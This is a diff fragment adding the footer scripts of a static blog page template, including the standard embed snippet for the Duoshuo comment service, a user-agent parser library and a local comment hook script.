+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"venidic"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    
+    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+</body>
+</html>
